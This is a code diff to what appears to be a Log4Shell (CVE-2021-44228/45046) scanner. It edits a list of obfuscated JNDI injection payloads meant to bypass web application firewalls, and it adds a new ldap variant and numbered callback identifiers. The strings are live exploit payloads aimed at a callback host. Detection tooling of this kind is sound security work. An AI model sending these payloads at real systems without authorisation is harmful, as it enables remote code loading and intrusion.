@@ -53,12 +53,13 @@ timeout = 4
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
+                       "${jndi:rmi://{{callback_host}}/{{random}}}",
                        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}",
+                       "${jndi:dns://{{callback_host}}/{{random}}}",
+                       "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}"
                        ]
 
 cve_2021_45046 = [
@@ -167,9 +168,11 @@ def get_fuzzing_post_data(payload):
 
 def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
+    count = 0
     for i in waf_bypass_payloads:
+        count = count + 1
         new_payload = i.replace("{{callback_host}}", callback_host)
-        new_payload = new_payload.replace("{{random}}", random_string)
+        new_payload = new_payload.replace("{{random}}", f'{random_string}_{count}')
         payloads.append(new_payload)
     return payloads
 
